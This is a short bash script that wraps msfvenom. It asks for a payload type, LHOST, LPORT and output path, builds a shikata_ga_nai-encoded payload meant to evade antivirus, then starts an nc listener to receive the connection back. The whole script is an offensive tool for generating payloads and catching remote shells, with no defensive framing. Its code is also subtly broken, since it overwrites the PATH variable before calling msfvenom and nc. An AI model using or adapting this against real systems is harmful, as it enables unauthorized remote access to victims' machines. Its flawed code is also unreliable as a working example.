

if [[ $EUID -ne 0 ]]
then
printf "\033[0;33m \t\t\tError In The Permission Try Width A Sudo Account\033[0m \n"
else
printf "\t\t\tWelcom Sudo .....\n"
##############################
printf "Hello Entre the type for msfvenom: "
read type_payload
printf "Entre LHOST #: "
read LHOST
printf "Entre LPORT #: "
read LPORT
printf "Entre the Redirection To Save The Payloads+Name Off The Payloads: "
read PATH

msfvenom -p $type_payload LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai R > $PATH

printf "The Payloads Hase Benn Secusfuly added in $PATH"

nc -lvp $LPORT

fi
